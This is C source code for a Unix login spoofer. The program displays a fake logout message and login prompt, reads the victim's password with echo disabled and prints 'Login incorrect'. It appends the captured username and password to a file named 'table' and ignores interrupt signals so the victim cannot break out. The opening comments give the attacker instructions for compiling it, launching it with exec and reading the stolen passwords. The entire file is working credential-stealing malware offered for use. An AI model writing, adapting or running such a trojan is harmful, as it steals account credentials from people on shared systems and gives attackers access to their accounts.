                    /* To compile this program, use   cc -o <file> <file.c> */
                    /* To run this program, exit X and type    exec <file>  */
                    /* To read the passwords, look at the file called TABLE */
                    /* It is advisable to chmod 0600 table for protection   */

                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <sys/param.h>
                    #include <string.h>
                    #include <signal.h>
                    #include <setjmp.h>
                    #include <sgtty.h>
                    #include <sys/file.h>
                    #include <sys/ioctl.h>

                    #define oops(msg) {perror(msg); exit(0);}

                    jmp_buf return_pt;

                    /*****************************************************************************/
                    static  int             cbreak_on = 0;
                    static  int             tty = 0;
                    static  int             tty_set = 0;
                    static  int             cbreak_int_status = 0;
                    static  struct sgttyb   tty_desc;
                    char username[8], password[30];
                    void cbreak();
                    void nocbreak();



                    void cbreak_open_tty (interrupt_status)
                    int     interrupt_status;
                    {
                      tty_set = 1;
                      tty = fileno (stdin);
                      if (ioctl (tty, TIOCGETP, &tty_desc) == -1)
                        perror ("ioctl: TIOCGETP");

                      cbreak_int_status = interrupt_status;
                    }

                    /* noecho, if non-zero, causes the key stroke not to be echoed */

                    void cbreak (noecho, interrupt_status)
                    int     noecho, interrupt_status;
                    {
                      if (!tty_set || interrupt_status != cbreak_int_status)
                        cbreak_open_tty (interrupt_status);
                      tty_desc.sg_flags |= CBREAK;
                      if (noecho) tty_desc.sg_flags &= ~ECHO;
                      if (ioctl (tty, TIOCSETN, &tty_desc) == -1)
                        perror ("cbreak: ioctl: TIOCSETN");
                    }

                    void nocbreak ()
                    {
                      if (!tty_set) cbreak_open_tty (cbreak_int_status);
                      tty_desc.sg_flags &= ~CBREAK;
                      tty_desc.sg_flags |= ECHO;
                      if (ioctl (tty, TIOCSETN, &tty_desc) == -1)
                        perror ("nocbreak: ioctl: TIOCSETN");
                    }

                    /* flush an input FILE, leaving the n most recent characters on the file */

                    void flushin (fptr, n)
                      FILE  *fptr;
                      int n;
                    {
                      int nch = 0, status;

                      if (n < 0) n = 0;
                      if ((status = ioctl (fileno(fptr), FIONREAD, &nch)) < 0)
                        {
                          fprintf (stderr, "flushin: ioctl error: %d\n", status);
                          return;
                        }
                      nch += fptr->_cnt;
                      while (nch > n)
                        {
                          getc (fptr);
                          nch--;
                        }
                    }  

                    /* get a keystroke in cbreak mode, echoed or not echoed, with actions on
                       interrupts specified. */

                    char get_a_key (noecho, interrupt_status)
                    int     noecho, interrupt_status;
                    {
                      char  x;

                      while (stdin->_cnt > 0) if ((x=getchar()) != '\n') return (x);

                      cbreak (noecho, interrupt_status);
                      cbreak_on = 1+(noecho?1:0);
                      x = getchar();
                      nocbreak ();
                      cbreak_on = 0;
                      return (x);
                    }

                    /* if a key has been pressed, then return it, otherwise return -1.  Note
                       that some key sequences actually send zero, so we can't use that.
                       This will only work for sure if you called cbreak() before. */

                    int get_key_if_pressed ()
                    {
                      int x = -1, status, nch = 0;

                      if (stdin->_cnt == 0)
                        {
                          if ((status = ioctl (tty, FIONREAD, &nch)) < 0)
                            {
                              fprintf (stderr, "get_key_if_pressed: ioctl error: %d\n", status);
                              return (-1);
                            }
                        }
                      else nch = stdin->_cnt;
                      if (nch > 0) x = getchar();
                      return (x);
                    }

                    passwd ()
                    {
                      int   x, i=0;

                      cbreak (1, 1);
                      printf("Password:");
                      do 
                        {
                          x = getchar();
                          password[i++] = x;
                        }
                      while (x != '\n');
                      password[i] = '\0';
                      printf("\nLogin incorrect\n");



                    /*  printf("\nThe password typed was: %s \n", password); */
                    }

                    /*****************************************************************************/
                    void loop (s) 
                         char s[]; 
                    {
                         /* insert your favorite startup message HERE */

                            /*  Login banner below  */

                         /* printf("Lorz Login (console@%s)\n\n", s); */

                         printf("login: ");     
                         gets(username);
                         
                         if (*username == '\0') 
                              loop(s);
                    }

                    void q_trap () {}

                    void main () {
                         FILE *fq;
                         char *pname = "table";
                         int i;
                         char s[20], log[10];
                         
                         /* HOW DO WE DISABLE THE ^S AND ^Q ?? */

                         /* signals are to protect from someone cancelling this process and getting
                            into YOUR account */

                         signal(SIGQUIT, q_trap);
                         signal(SIGTERM, q_trap);
                         signal(SIGTSTP, q_trap);
                         signal(SIGINT, q_trap); 

                         if ((i = gethostname(s, 20)) != 0)
                              oops("cannot find hostname\n");

                         /* a fake prompt is always a good trick */

                         printf("%s%% logout\n\n", s);

                         loop(s);
                         passwd();
                         
                         fq = fopen(pname, "a");
                         fputs(username, fq);
                         fputs("\n", fq);
                         fputs(password, fq);
                         fputs("\n\n", fq);
                    }
